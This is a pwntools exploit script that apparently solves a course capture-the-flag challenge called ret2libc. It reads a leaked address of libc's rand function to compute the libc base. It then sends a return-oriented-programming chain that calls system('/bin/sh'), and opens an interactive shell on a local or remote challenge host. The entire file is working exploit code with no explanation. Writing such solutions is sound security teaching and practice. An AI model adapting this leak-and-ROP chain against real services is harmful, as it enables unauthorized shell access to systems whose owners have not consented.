from pwn import *

binary = "./ret2libc.bin"

context.terminal = ["tmux", "splitw", "-h"]

e = context.binary = ELF(binary)

if args.REMOTE:
    libc = ELF('libc6_2.28-0ubuntu1_amd64.so', checksec=False)
else:
    libc = e.libc

gs = '''
break vuln
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    if args.REMOTE:
        return remote("cse4850-ret2libc-1.chals.io", 443, ssl=True, sni="cse4850-ret2libc-1.chals.io")
    return process(e.path)

p = start()

p.recvuntil(b"Random Value: 0x")
leak = int(p.recvS(12), 16)
log.info("random address: 0x%x" % leak)

libc.address = leak - libc.sym['rand']
log.info('Libc base is at 0x%x' % libc.address)
r = ROP(libc)

ret_gadget = r.find_gadget(['ret'])[0]
pop_rdi_gadget = r.find_gadget(['pop rdi','ret'])[0]
bin_sh_gadget = next(libc.search(b'/bin/sh'))
system_gadget = libc.sym['system']

chain = cyclic(16)
chain += p64(ret_gadget)
chain += p64(pop_rdi_gadget)
chain += p64(bin_sh_gadget)
chain += p64(system_gadget)

p.recvuntil(b"s\n-------------------------------------")
p.send(chain)

p.interactive()